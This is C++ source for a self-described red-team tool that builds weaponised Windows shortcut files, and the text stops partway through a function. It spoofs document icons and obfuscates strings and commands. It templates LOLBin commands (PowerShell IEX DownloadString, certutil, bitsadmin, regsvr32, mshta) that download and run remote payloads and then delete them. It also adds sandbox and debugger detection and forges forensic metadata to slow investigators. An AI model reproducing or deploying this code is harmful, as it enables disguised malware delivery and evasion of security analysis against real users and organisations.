// lnk_tool_unified_v4.cpp
// =============================================================================
// Herramienta Profesional de Generacion y Verificacion de LNK (Red Team)
// Version 4.0 - Implementacion Completa de las 7 Mejoras OPSEC
// =============================================================================
//
// COMPILACION:
//   MSVC:  cl.exe /EHsc /std:c++17 /O2 /W4 lnk_tool_unified_v4.cpp ole32.lib shell32.lib user32.lib advapi32.lib
//   MinGW: g++ -std=c++17 -O2 -o lnk_tool.exe lnk_tool_unified_v4.cpp -lole32 -lshell32 -luser32 -ladvapi32
//
// NOVEDADES v4.0:
//   1. Icon Spoofing - Mapeo automatico de iconos por extension
//   2. LOLBins - Cadenas de ejecucion con binarios legitimos
//   3. Anti-Sandbox - Checks de entorno antes de ejecucion
//   4. File Smuggling - Descarga + ejecucion + limpieza
//   5. Metadatos Forenses - VolumeID, serial numbers realistas
//   6. Env Var Obfuscation - Ofuscacion de argumentos
//   7. Polimorfismo - Generacion masiva con mutaciones
//
// =============================================================================

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlobj.h>
#include <objbase.h>
#include <tlhelp32.h>
#include <iphlpapi.h>

#include <algorithm>
#include <array>
#include <chrono>
#include <cstdint>
#include <cstring>
#include <ctime>
#include <filesystem>
#include <fstream>
#include <functional>
#include <iomanip>
#include <initializer_list>
#include <iostream>
#include <map>
#include <memory>
#include <mutex>
#include <optional>
#include <random>
#include <set>
#include <sstream>
#include <stdexcept>
#include <string>
#include <string_view>
#include <type_traits>
#include <unordered_map>
#include <unordered_set>
#include <vector>

// =============================================================================
// SECCION 1: OPSEC - Ofuscacion Multicapa en Tiempo de Compilacion
// =============================================================================
namespace obf {

constexpr uint32_t compileSeed() {
    return static_cast<uint32_t>(__TIME__[0] - '0') * 10000000u +
           static_cast<uint32_t>(__TIME__[1] - '0') * 1000000u +
           static_cast<uint32_t>(__TIME__[3] - '0') * 100000u +
           static_cast<uint32_t>(__TIME__[4] - '0') * 10000u +
           static_cast<uint32_t>(__TIME__[6] - '0') * 1000u +
           static_cast<uint32_t>(__TIME__[7] - '0') * 100u;
}

constexpr uint8_t lcgNext(uint32_t& state) {
    state = state * 1664525u + 1013904223u;
    return static_cast<uint8_t>((state >> 16) & 0xFF);
}

template<uint32_t Seed, size_t N>
struct ObfString {
    char data[N];

    constexpr explicit ObfString(const char(&s)[N]) : data{} {
        uint32_t state = Seed;
        for (size_t i = 0; i < N; ++i) {
            uint8_t keyByte = lcgNext(state);
            keyByte ^= static_cast<uint8_t>(i * 0x37 + 0xA5);
            data[i] = static_cast<char>(s[i] ^ keyByte);
        }
    }

    [[nodiscard]] std::string decrypt() const {
        std::string out(N - 1, '\0');
        uint32_t state = Seed;
        volatile uint8_t sink = 0;
        for (size_t i = 0; i < N - 1; ++i) {
            uint8_t keyByte = lcgNext(state);
            keyByte ^= static_cast<uint8_t>(i * 0x37 + 0xA5);
            out[i] = static_cast<char>(data[i] ^ keyByte);
            sink ^= static_cast<uint8_t>(out[i]);
        }
        (void)sink;
        return out;
    }
};

#define OBF_SALT (::obf::compileSeed() ^ (__LINE__ * 2654435761u))
#define OBF_STR(s) (::obf::ObfString<OBF_SALT, sizeof(s)>(s).decrypt())

class XorShifter {
public:
    static void apply(std::vector<uint8_t>& data, const std::array<uint8_t, 32>& key) {
        for (size_t i = 0; i < data.size(); ++i) {
            data[i] ^= key[i % key.size()];
            data[i] ^= static_cast<uint8_t>((i * 0x37) & 0xFF);
        }
    }

    [[nodiscard]] static std::array<uint8_t, 32> generateKey(uint32_t seed) {
        std::array<uint8_t, 32> key{};
        uint32_t state = seed;
        for (auto& byte : key) {
            byte = lcgNext(state);
        }
        return key;
    }
};

template<typename T>
void secureZero(T& container) {
    volatile uint8_t* p = reinterpret_cast<volatile uint8_t*>(
        const_cast<typename std::remove_const_t<typename T::value_type>*>(container.data()));
    size_t bytes = container.size() * sizeof(typename T::value_type);
    for (size_t i = 0; i < bytes; ++i) {
        p[i] = 0;
    }
}

} // namespace obf

// =============================================================================
// SECCION 2: Especificacion MS-SHLLINK
// =============================================================================
namespace spec {

struct Sizes {
    static constexpr size_t HEADER = 0x4C;
    static constexpr size_t MAX_PATH_ANSI = 260;
    static constexpr size_t MAX_PATH_UNICODE = 520;
    static constexpr size_t ENV_BLOCK = 0x314;
    static constexpr size_t KNOWN_FOLDER_BLOCK = 0x28;
};

struct Guid {
    static constexpr std::array<uint8_t, 16> SHELL_LINK = {
        0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46
    };
};

enum class LinkFlag : uint32_t {
    None                            = 0x00000000,
    HasLinkTargetIDList             = 0x00000001,
    HasLinkInfo                     = 0x00000002,
    HasName                         = 0x00000004,
    HasRelativePath                 = 0x00000008,
    HasWorkingDir                   = 0x00000010,
    HasArguments                    = 0x00000020,
    HasIconLocation                 = 0x00000040,
    IsUnicode                       = 0x00000080,
    ForceNoLinkInfo                 = 0x00000100,
    HasExpString                    = 0x00000200,
    RunInSeparateProcess            = 0x00000400,
    HasDarwinId                     = 0x00001000,
    RunAsUser                       = 0x00002000,
    HasExpIcon                      = 0x00004000,
    NoPidlAlias                     = 0x00008000,
    RunWithShimLayer                = 0x00020000,
    ForceNoLinkTrack                = 0x00040000,
    EnableTargetMetadata            = 0x00080000,
    DisableLinkPathTracking         = 0x00100000,
    DisableKnownFolderTracking      = 0x00200000,
    DisableKnownFolderAlias         = 0x00400000,
    AllowLinkToLink                 = 0x00800000,
    UnaliasOnSave                   = 0x01000000,
    PreferEnvironmentPath           = 0x02000000,
    KeepLocalIdListForUncTarget     = 0x04000000
};

constexpr LinkFlag operator|(LinkFlag a, LinkFlag b) {
    return static_cast<LinkFlag>(static_cast<uint32_t>(a) | static_cast<uint32_t>(b));
}

constexpr LinkFlag& operator|=(LinkFlag& a, LinkFlag b) {
    a = a | b;
    return a;
}

enum class FileAttr : uint32_t {
    None        = 0x00000000,
    ReadOnly    = 0x00000001,
    Hidden      = 0x00000002,
    System      = 0x00000004,
    Directory   = 0x00000010,
    Archive     = 0x00000020,
    Normal      = 0x00000080
};

enum class ShowCmd : uint32_t {
    Normal          = 0x01,
    Maximized       = 0x03,
    MinNoActive     = 0x07
};

enum class LinkInfoFlag : uint32_t {
    VolumeIDAndLocalBasePath                = 0x00000001,
    CommonNetworkRelativeLinkAndPathSuffix  = 0x00000002
};

struct BlockSignature {
    static constexpr uint32_t ENVIRONMENT_VARIABLES   = 0xA0000001;
    static constexpr uint32_t KNOWN_FOLDER            = 0xA000000B;
    static constexpr uint32_t TERMINATOR              = 0x00000000;
};

struct ItemConsts {
    static constexpr std::array<uint8_t, 20> COMPUTER = {
        0x1F, 0x50, 0xE0, 0x4F, 0xD0, 0x20, 0xEA, 0x3A,
        0x69, 0x10, 0xA2, 0xD8, 0x08, 0x00, 0x2B, 0x30,
        0x30, 0x9D, 0x00, 0x00
    };
    static constexpr uint8_t ITEM_IS_FILE      = 0x30;
    static constexpr uint8_t ITEM_IS_DIRECTORY = 0x31;
    static constexpr uint8_t ITEM_HAS_UNICODE  = 0x04;
};

} // namespace spec

// =============================================================================
// SECCION 3: Utilidades de Codificacion Binaria
// =============================================================================
namespace core {

class ByteEncoder {
public:
    template<typename T>
    [[nodiscard]] static std::vector<uint8_t> toLE(T value) {
        static_assert(std::is_arithmetic_v<T> || std::is_enum_v<T>);
        std::vector<uint8_t> bytes(sizeof(T));
        std::memcpy(bytes.data(), &value, sizeof(T));
        return bytes;
    }

    template<typename T>
    [[nodiscard]] static std::vector<uint8_t> toLE(T value, size_t size) {
        std::vector<uint8_t> bytes(size, 0);
        for (size_t i = 0; i < size && i < sizeof(T); ++i) {
            bytes[i] = static_cast<uint8_t>((value >> (i * 8)) & 0xFF);
        }
        return bytes;
    }

    template<typename T>
    [[nodiscard]] static T fromLE(const uint8_t* data) {
        T value{};
        std::memcpy(&value, data, sizeof(T));
        return value;
    }

    [[nodiscard]] static std::vector<uint8_t> toUTF16LE(std::string_view str) {
        std::vector<uint8_t> result;
        result.reserve(str.size() * 2);
        for (char c : str) {
            result.push_back(static_cast<uint8_t>(static_cast<unsigned char>(c)));
            result.push_back(0x00);
        }
        return result;
    }

    [[nodiscard]] static std::vector<uint8_t> toUTF16LE(const std::wstring& wstr) {
        std::vector<uint8_t> result;
        result.reserve(wstr.size() * 2);
        for (wchar_t wc : wstr) {
            result.push_back(static_cast<uint8_t>(wc & 0xFF));
            result.push_back(static_cast<uint8_t>((wc >> 8) & 0xFF));
        }
        return result;
    }

    [[nodiscard]] static uint32_t crc32(const std::vector<uint8_t>& data) {
        uint32_t crc = 0xFFFFFFFF;
        for (uint8_t byte : data) {
            crc ^= byte;
            for (int bit = 0; bit < 8; ++bit) {
                uint32_t mask = -(crc & 1u);
                crc = (crc >> 1) ^ (0xEDB88320u & mask);
            }
        }
        return crc ^ 0xFFFFFFFF;
    }

    static void secureClear(std::vector<uint8_t>& data) {
        volatile uint8_t* p = data.data();
        for (size_t i = 0; i < data.size(); ++i) {
            p[i] = 0;
        }
        data.clear();
    }
};

template<typename T>
class ComPtr {
    T* ptr_ = nullptr;
public:
    ComPtr() = default;
    explicit ComPtr(T* p) : ptr_(p) {}
    ~ComPtr() { reset(); }
    ComPtr(const ComPtr&) = delete;
    ComPtr& operator=(const ComPtr&) = delete;
    ComPtr(ComPtr&& other) noexcept : ptr_(other.ptr_) { other.ptr_ = nullptr; }
    ComPtr& operator=(ComPtr&& other) noexcept {
        if (this != &other) { reset(); ptr_ = other.ptr_; other.ptr_ = nullptr; }
        return *this;
    }
    void reset() { if (ptr_) { ptr_->Release(); ptr_ = nullptr; } }
    T** operator&() { return &ptr_; }
    T* operator->() const { return ptr_; }
    T* get() const { return ptr_; }
    explicit operator bool() const { return ptr_ != nullptr; }
    HRESULT createInstance(REFCLSID rclsid, DWORD clsctx = CLSCTX_INPROC_SERVER) {
        reset();
        return CoCreateInstance(rclsid, nullptr, clsctx, __uuidof(T), reinterpret_cast<void**>(&ptr_));
    }
};

class ComInitializer {
    bool initialized_ = false;
public:
    explicit ComInitializer(DWORD coinit = COINIT_APARTMENTTHREADED) {
        initialized_ = SUCCEEDED(CoInitializeEx(nullptr, coinit));
    }
    ~ComInitializer() { if (initialized_) CoUninitialize(); }
    explicit operator bool() const { return initialized_; }
};

} // namespace core

// =============================================================================
// SECCION 4: MEJORA 1 - Icon Spoofing
// =============================================================================
namespace iconspoofer {

struct IconMapping {
    std::string dll;
    int index;
};

// Mapeo de extensiones a iconos del sistema
static const std::unordered_map<std::string, IconMapping> ExtensionIconMap = {
    {".pdf",   {"imageres.dll", 67}},
    {".docx",  {"imageres.dll", 1}},
    {".doc",   {"imageres.dll", 1}},
    {".xlsx",  {"imageres.dll", 2}},
    {".xls",   {"imageres.dll", 2}},
    {".pptx",  {"imageres.dll", 3}},
    {".ppt",   {"imageres.dll", 3}},
    {".txt",   {"imageres.dll", 69}},
    {".rtf",   {"imageres.dll", 70}},
    {".jpg",   {"imageres.dll", 68}},
    {".jpeg",  {"imageres.dll", 68}},
    {".png",   {"imageres.dll", 68}},
    {".gif",   {"imageres.dll", 68}},
    {".bmp",   {"imageres.dll", 68}},
    {".html",  {"shell32.dll", 14}},
    {".htm",   {"shell32.dll", 14}},
    {".url",   {"shell32.dll", 14}},
    {".exe",   {"shell32.dll", 2}},
    {".msi",   {"shell32.dll", 2}},
    {".bat",   {"shell32.dll", 2}},
    {".cmd",   {"shell32.dll", 2}},
    {".ps1",   {"shell32.dll", 2}},
    {".vbs",   {"shell32.dll", 2}},
    {".js",    {"shell32.dll", 2}},
    {".zip",   {"shell32.dll", 52}},
    {".rar",   {"shell32.dll", 52}},
    {".7z",    {"shell32.dll", 52}},
    {".mp3",   {"shell32.dll", 40}},
    {".mp4",   {"shell32.dll", 40}},
    {".avi",   {"shell32.dll", 40}},
    {".mkv",   {"shell32.dll", 40}},
    {".wav",   {"shell32.dll", 40}},
    {".lnk",   {"shell32.dll", 29}},
    {".xml",   {"shell32.dll", 71}},
    {".json",  {"shell32.dll", 71}},
    {".csv",   {"shell32.dll", 71}}
};

// Labels corporativos para volumenes
static const std::vector<std::string> CorporateVolumeLabels = {
    "OS", "Windows", "Local Disk", "System", "DATA", "WORK"
};

inline IconMapping getIconForExtension(const std::string& extension) {
    std::string ext = extension;
    std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);

    auto it = ExtensionIconMap.find(ext);
    if (it != ExtensionIconMap.end()) {
        return it->second;
    }

    // Fallback: imageres.dll icono generico
    return {"imageres.dll", 1};
}

inline std::string getSystemIconPath(const std::string& dllName) {
    char systemDir[MAX_PATH] = {};
    GetSystemDirectoryA(systemDir, MAX_PATH);
    return std::string(systemDir) + "\\" + dllName;
}

inline std::string inferExtensionFromPath(const std::string& path) {
    size_t dotPos = path.find_last_of('.');
    if (dotPos != std::string::npos) {
        return path.substr(dotPos);
    }
    return ".exe";
}

} // namespace iconspoofer

// =============================================================================
// SECCION 5: MEJORA 2 - LOLBins Support
// =============================================================================
namespace lolbin {

enum class Category {
    DOWNLOAD,
    EXECUTION,
    INJECTION,
    BYPASS,
    ORCHESTRATOR
};

struct LolBinDef {
    std::string binary;
    std::string templateArgs;
    Category category;
    bool needsEncoding;
};

static const std::unordered_map<std::string, LolBinDef> LolBinRegistry = {
    {"mshta", {
        "mshta.exe",
        "{url}",
        Category::EXECUTION,
        false
    }},
    {"powershell", {
        "powershell.exe",
        "-window hidden -enc {base64_payload}",
        Category::EXECUTION,
        true
    }},
    {"powershell_iex", {
        "powershell.exe",
        "-c \"IEX(New-Object Net.WebClient).DownloadString('{url}')\"",
        Category::EXECUTION,
        false
    }},
    {"rundll32", {
        "rundll32.exe",
        "{dll},{entrypoint}",
        Category::INJECTION,
        false
    }},
    {"certutil", {
        "certutil.exe",
        "-urlcache -split -f {url} {output}",
        Category::DOWNLOAD,
        false
    }},
    {"bitsadmin", {
        "bitsadmin.exe",
        "/transfer {job} /download /priority foreground {url} {output}",
        Category::DOWNLOAD,
        false
    }},
    {"regsvr32", {
        "regsvr32.exe",
        "/s /n /u /i:{url} scrobj.dll",
        Category::EXECUTION,
        false
    }},
    {"msiexec", {
        "msiexec.exe",
        "/q /i {url}",
        Category::EXECUTION,
        false
    }},
    {"cmd", {
        "cmd.exe",
        "/c {command}",
        Category::ORCHESTRATOR,
        false
    }},
    {"wmic", {
        "wmic.exe",
        "os get /format:\"{url}\"",
        Category::EXECUTION,
        false
    }},
    {"cscript", {
        "cscript.exe",
        "//nologo {url}",
        Category::EXECUTION,
        false
    }}
};

inline std::string base64Encode(const std::string& input) {
    static const char* chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string result;
    result.reserve(((input.size() + 2) / 3) * 4);

    for (size_t i = 0; i < input.size(); i += 3) {
        uint32_t n = static_cast<unsigned char>(input[i]) << 16;
        if (i + 1 < input.size()) n |= static_cast<unsigned char>(input[i + 1]) << 8;
        if (i + 2 < input.size()) n |= static_cast<unsigned char>(input[i + 2]);

        result.push_back(chars[(n >> 18) & 0x3F]);
        result.push_back(chars[(n >> 12) & 0x3F]);
        result.push_back((i + 1 < input.size()) ? chars[(n >> 6) & 0x3F] : '=');
        result.push_back((i + 2 < input.size()) ? chars[n & 0x3F] : '=');
    }
    return result;
}

inline std::string base64EncodeUTF16LE(const std::string& input) {
    std::wstring wstr(input.begin(), input.end());
    std::string utf16le;
    utf16le.reserve(wstr.size() * 2);
    for (wchar_t wc : wstr) {
        utf16le.push_back(static_cast<char>(wc & 0xFF));
        utf16le.push_back(static_cast<char>((wc >> 8) & 0xFF));
    }
    return base64Encode(utf16le);
}

inline std::string buildLolBinCommand(const std::string& name,
                                       const std::map<std::string, std::string>& params) {
    auto it = LolBinRegistry.find(name);
    if (it == LolBinRegistry.end()) {
        throw std::runtime_error("Unknown LOLBin: " + name);
    }

    const LolBinDef& def = it->second;
    std::string args = def.templateArgs;

    for (const auto& [key, value] : params) {
        std::string placeholder = "{" + key + "}";
        size_t pos = args.find(placeholder);
        while (pos != std::string::npos) {
            std::string actualValue = value;
            if (key == "base64_payload" && def.needsEncoding) {
                actualValue = base64EncodeUTF16LE(value);
            }
            args.replace(pos, placeholder.length(), actualValue);
            pos = args.find(placeholder);
        }
    }

    return def.binary + " " + args;
}

// Generar nombre de trabajo aleatorio para bitsadmin
inline std::string generateJobName(size_t length = 8) {
    static const char* chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 35);

    std::string result;
    result.reserve(length);
    for (size_t i = 0; i < length; ++i) {
        result.push_back(chars[dis(gen)]);
    }
    return result;
}

// Cadena de descarga + ejecucion
inline std::string buildDownloadAndExecute(const std::string& url,
                                            const std::string& outputPath,
                                            const std::string& method = "certutil") {
    std::map<std::string, std::string> downloadParams = {
        {"url", url},
        {"output", outputPath},
        {"job", generateJobName()}
    };

    std::string downloadCmd = buildLolBinCommand(method, downloadParams);
    std::string execCmd = outputPath;

    return downloadCmd + " & " + execCmd;
}

} // namespace lolbin

// =============================================================================
// SECCION 6: MEJORA 3 - Anti-Sandbox y Evasion EDR
// =============================================================================
namespace antisandbox {

// Procesos de analisis conocidos
static const std::vector<std::string> AnalysisProcesses = {
    "wireshark", "procmon", "procexp", "x64dbg", "x32dbg",
    "ida", "idag", "idaw", "idaq", "idau",
    "ollydbg", "immunitydebugger", "windbg",
    "processhacker", "sysmon", "etwdumper",
    "sandboxiedcomlaunch", "sandboxierpcss",
    "procmon", "filemon", "regmon",
    "vmware", "vboxservice", "vboxtray",
    "vmtoolsd", "vmwareuser"
};

// Hostnames sospechosos de sandbox
static const std::vector<std::string> SuspiciousHostnames = {
    "SANDBOX", "MALWARE", "VIRUS", "SAMPLE", "TEST",
    "VMWARE", "VBOX", "VIRTUAL", "ANALYSIS", "CUCKOO"
};

// Prefijos MAC de VMs conocidas
static const std::vector<std::string> VMMacPrefixes = {
    "08:00:27",  // VirtualBox
    "00:0C:29",  // VMware
    "00:15:5D",  // Hyper-V
    "00:50:56",  // VMware
    "00:1C:14",  // VMware
    "52:54:00",  // QEMU
    "00:1A:4A",  // Parallels
    "00:03:FF",  // Microsoft Hyper-V
};

inline bool checkSuspiciousProcess() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    bool found = false;
    if (Process32First(snapshot, &pe32)) {
        do {
            std::string processName = pe32.szExeFile;
            std::transform(processName.begin(), processName.end(),
                           processName.begin(), ::tolower);

            for (const auto& suspicious : AnalysisProcesses) {
                if (processName.find(suspicious) != std::string::npos) {
                    found = true;
                    break;
                }
            }
            if (found) break;
        } while (Process32Next(snapshot, &pe32));
    }

    CloseHandle(snapshot);
    return found;
}

inline bool checkSuspiciousHostname() {
    char hostname[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameA(hostname, &size);

    std::string hn(hostname);
    std::transform(hn.begin(), hn.end(), hn.begin(), ::toupper);

    for (const auto& suspicious : SuspiciousHostnames) {
        if (hn.find(suspicious) != std::string::npos) {
            return true;
        }
    }

    // Verificar hostname generico (DESKTOP-XXXXX)
    if (hn.find("DESKTOP-") == 0 && hn.length() <= 15) {
        // Patron tipico de VM, pero no concluyente
    }

    return false;
}

inline bool checkLowMemory() {
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);

    // Menos de 4GB de RAM fisica
    ULONGLONG totalPhysMB = memStatus.ullTotalPhys / (1024 * 1024);
    return totalPhysMB < 4096;
}

inline bool checkShortUptime() {
    ULONGLONG tickCount = GetTickCount64();
    // Menos de 10 minutos de uptime
    return tickCount < (10 * 60 * 1000);
}

inline bool checkVMMacAddress() {
    PIP_ADAPTER_INFO adapterInfo = nullptr;
    ULONG size = 0;

    if (GetAdaptersInfo(nullptr, &size) != ERROR_BUFFER_OVERFLOW) {
        return false;
    }

    adapterInfo = reinterpret_cast<PIP_ADAPTER_INFO>(malloc(size));
    if (!adapterInfo) return false;

    bool found = false;
    if (GetAdaptersInfo(adapterInfo, &size) == NO_ERROR) {
        PIP_ADAPTER_INFO adapter = adapterInfo;
        while (adapter) {
            std::string mac;
            char hex[4];
            for (int i = 0; i < adapter->AddressLength && i < 6; ++i) {
                snprintf(hex, sizeof(hex), "%02X", adapter->Address[i]);
                mac += hex;
                if (i < 2) mac += ":";
            }
            mac = mac.substr(0, 8); // Solo los primeros 3 octetos

            std::transform(mac.begin(), mac.end(), mac.begin(), ::toupper);

            for (const auto& vmPrefix : VMMacPrefixes) {
                if (mac.find(vmPrefix) != std::string::npos) {
                    found = true;
                    break;
                }
            }
            if (found) break;
            adapter = adapter->Next;
        }
    }

    free(adapterInfo);
    return found;
}

// Generar script de pre-check para CMD
inline std::string generateAntiSandboxScript(const std::string& payloadCommand,
                                              const std::string& benignCommand = "notepad.exe") {
    std::ostringstream script;

    script << "cmd.exe /c \"setlocal enabledelayedexpansion & set SAFE=1 & ";

    // Check hostname
    script << "for /f %%h in ('hostname') do @echo %%h | findstr /i /r \"SANDBOX MALWARE VIRUS SAMPLE\" >nul && set SAFE=0 & ";

    // Check procesos de analisis
    script << "tasklist | findstr /i \"wireshark procmon x64dbg ida ollydbg sandbox\" >nul && set SAFE=0 & ";

    // Check RAM minima (2GB = ~2097151 en KB)
    script << "for /f \"skip=1\" %%m in ('wmic computersystem get totalphysicalmemory') do @if %%m LSS 2147483648 set SAFE=0 & ";

    // Delay para evadir timeout de sandbox
    script << "timeout /t 5 /nobreak >nul & ";

    // Ejecutar segun resultado
    script << "if !SAFE!==1 ( " << payloadCommand << " ) else ( " << benignCommand << " ) & endlocal\"";

    return script.str();
}

// Version corta con solo delay
inline std::string addDelayToCommand(const std::string& command, int seconds) {
    std::ostringstream cmd;
    cmd << "cmd.exe /c \"timeout /t " << seconds << " /nobreak >nul & " << command << "\"";
    return cmd.str();
}

} // namespace antisandbox

// =============================================================================
// SECCION 7: MEJORA 4 - File Smuggling
// =============================================================================
namespace smuggling {

enum class Transport {
    CERTUTIL,
    BITSADMIN,
    POWERSHELL,
    EXPAND
};

inline std::string obfuscateURL(const std::string& url) {
    // Metodo: fragmentar URL en variables de entorno
    std::string result = "cmd.exe /c \"";

    // Encontrar el punto de division
    size_t httpEnd = url.find("://") + 3;
    size_t firstSlash = url.find('/', httpEnd);

    std::string protocol = url.substr(0, url.find("://") + 3);
    std::string domain = url.substr(httpEnd, firstSlash - httpEnd);
    std::string path = url.substr(firstSlash);

    // Dividir en partes
    std::vector<std::string> parts;
    parts.push_back(protocol);
    parts.push_back(domain);
    parts.push_back(path);

    // Crear variables de entorno
    char varName[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    int varIdx = 0;

    std::string reconstruction;
    for (const auto& part : parts) {
        if (varIdx >= 26) break;

        result += "set ";
        result += varName[varIdx];
        result += "=";
        result += part;
        result += "&";

        reconstruction += "%";
        reconstruction += varName[varIdx];
        reconstruction += "%";

        varIdx++;
    }

    // Comando final (placeholder)
    result += "echo ";
    result += reconstruction;
    result += "\"";

    return result;
}

inline std::string buildSmugglingCommand(Transport transport,
                                          const std::string& url,
                                          const std::string& outputPath,
                                          bool execute = true,
                                          bool cleanup = true) {
    std::ostringstream cmd;

    // Seleccionar transporte
    switch (transport) {
        case Transport::CERTUTIL:
            cmd << "certutil -urlcache -split -f \"" << url << "\" \"" << outputPath << "\"";
            break;

        case Transport::BITSADMIN:
            cmd << "bitsadmin /transfer " << lolbin::generateJobName()
                << " /download /priority foreground \"" << url << "\" \"" << outputPath << "\"";
            break;

        case Transport::POWERSHELL:
            cmd << "powershell -c \"(New-Object Net.WebClient).DownloadFile('" << url << "','" << outputPath << "')\"";
            break;

        case Transport::EXPAND:
            // expand \\\\server\\share\\file.cab destino
            cmd << "expand \"" << url << "\" \"" << outputPath << "\"";
            break;
    }

    // Agregar ejecucion
    if (execute) {
        cmd << " & \"" << outputPath << "\"";
    }

    // Agregar limpieza
    if (cleanup) {
        cmd << " & del /f /q \"" << outputPath << "\"";
    }

    return cmd.str();
}

inline std::string buildFullSmugglingChain(const std::string& url,
                                            const std::string& filename,
                                            Transport transport = Transport::CERTUTIL,
                                            int delaySeconds = 0) {
    std::string outputPath = "%PUBLIC%\\" + filename;

    std::string command = buildSmugglingCommand(transport, url, outputPath);

    if (delaySeconds > 0) {
        command = antisandbox::addDelayToCommand(command, delaySeconds);
    }

    return command;
}

} // namespace smuggling

// =============================================================================
// SECCION 8: MEJORA 5 - Metadatos Forenses
// =============================================================================
namespace forensic {

// Generar numero de serie de volumen realista
inline uint32_t generateRealisticVolumeSerial() {
    std::random_device rd;
    std::mt19937 gen(rd());

    // Metodo 1: basado en fecha/tiempo (como Windows)
    std::uniform_int_distribution<> mesDist(1, 12);
    std::uniform_int_distribution<> diaDist(1, 28);
    std::uniform_int_distribution<> horaDist(0, 23);
    std::uniform_int_distribution<> minDist(0, 59);

    uint16_t parteFecha = (mesDist(gen) << 8) | diaDist(gen);
    uint16_t parteTiempo = (horaDist(gen) << 8) | minDist(gen);

    uint32_t serial = (static_cast<uint32_t>(parteFecha) << 16) | parteTiempo;

    return serial;
}

// Timestamps forenses coherentes
struct ForensicTimestamps {
    FILETIME creation;
    FILETIME modification;
    FILETIME access;
};

inline ForensicTimestamps generateForensicTimestamps() {
    std::random_device rd;
    std::mt19937 gen(rd());

    // Fecha base entre 2020 y ahora
    auto now = std::chrono::system_clock::now();
    auto baseTime = std::chrono::system_clock::from_time_t(1577836800); // 2020-01-01

    auto duration = now - baseTime;
    auto daysSinceBase = std::chrono::duration_cast<std::chrono::hours>(duration).count() / 24;

    std::uniform_int_distribution<> dayOffsetDist(0, static_cast<int>(daysSinceBase));
    std::uniform_int_distribution<> hourOffsetDist(1, 24 * 180); // hasta 180 dias despues

    time_t baseTs = 1577836800 + (dayOffsetDist(gen) * 86400);

    // Creation: fecha base
    time_t creationTs = baseTs;
    // Modification: despues de creation
    time_t modificationTs = creationTs + hourOffsetDist(gen) * 3600;
    // Access: despues de modification o igual
    time_t accessTs = modificationTs + (hourOffsetDist(gen) / 24) * 3600;

    // Limitar a ahora
    time_t nowTs = std::chrono::system_clock::to_time_t(now);
    if (accessTs > nowTs) accessTs = nowTs;

    auto fileTimeFromUnix = [](time_t unixTs) -> FILETIME {
        ULARGE_INTEGER uli;
        uli.QuadPart = static_cast<ULONGLONG>(unixTs) * 10000000ULL + 116444736000000000ULL;
        FILETIME ft;
        ft.dwLowDateTime = uli.LowPart;
        ft.dwHighDateTime = uli.HighPart;
        return ft;
    };

    return {
        fileTimeFromUnix(creationTs),
        fileTimeFromUnix(modificationTs),
        fileTimeFromUnix(accessTs)
    };
}

// Seleccionar label de volumen corporativo
inline std::string selectVolumeLabel() {
    static const std::vector<std::string> labels = iconspoofer::CorporateVolumeLabels;
    static std::discrete_distribution<> dist({30, 20, 25, 10, 10, 5});

    std::random_device rd;
    std::mt19937 gen(rd());

    return labels[dist(gen)];
}

} // namespace forensic

// =============================================================================
// SECCION 9: MEJORA 6 - Ofuscacion mediante Variables de Entorno
// =============================================================================
namespace envobf {

// Metodo 1: Fragmentacion por caracteres
inline std::string charFragmentation(const std::string& input) {
    std::ostringstream result;
    result << "cmd.exe /c \"";

    // Crear variables para cada caracter
    for (size_t i = 0; i < input.size(); ++i) {
        result << "set _" << i << "=" << input[i] << "&";
    }

    // Reconstruir concatenando
    result << "cmd /c ";
    for (size_t i = 0; i < input.size(); ++i) {
        result << "%_" << i << "%";
    }

    result << "\"";
    return result.str();
}

// Metodo 2: Substrings de variables de entorno existentes
inline std::string envSubstitution(const std::string& input) {
    // Variables de entorno utiles y sus caracteres disponibles
    // %COMSPEC% = C:\Windows\System32\cmd.exe
    // %OS% = Windows_NT
    // %PATHEXT% = .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC

    std::string result;
    result.reserve(input.size() * 10);

    // Mapa de substituciones basicas
    static const std::map<char, std::string> substitutions = {
        {'c', "%COMSPEC:~0,1%"},    // C
        {'C', "%COMSPEC:~0,1%"},
        {'m', "%COMSPEC:~10,1%"},   // m de cmd.exe
        {'d', "%COMSPEC:~14,1%"},   // d de cmd.exe
        {'e', "%COMSPEC:~15,1%"},   // e de cmd.exe
        {'x', "%COMSPEC:~16,1%"},   // x de .exe
        {'.', "%COMSPEC:~20,1%"},   // . de .exe
        {'\\', "%COMSPEC:~2,1%"},   // backslash
        {':', "%COMSPEC:~1,1%"},    // :
        {'W', "%COMSPEC:~3,1%"},    // W de Windows
        {'i', "%COMSPEC:~4,1%"},    // i
        {'n', "%COMSPEC:~5,1%"},    // n
        {'s', "%COMSPEC:~9,1%"},    // s de System32
        {'S', "%COMSPEC:~9,1%"},
        {'t', "%COMSPEC:~13,1%"},   // t de System32
        {'3', "%COMSPEC:~17,1%"},   // 3
        {'2', "%COMSPEC:~18,1%"},   // 2
        {'N', "%OS:~8,1%"},         // N de Windows_NT
        {'T', "%OS:~10,1%"},        // T de Windows_NT
        {'_', "%OS:~7,1%"},         // _
    };

    for (char c : input) {
        auto it = substitutions.find(c);
        if (it != substitutions.end()) {
            result += it->second;
        } else {
            result += c;
        }
    }

    return result;
}

// Metodo 3: XOR con clave derivada del entorno
inline std::string xorWithEnvKey(const std::string& input, const std::string& envKey) {
    std::string result;
    result.reserve(input.size());

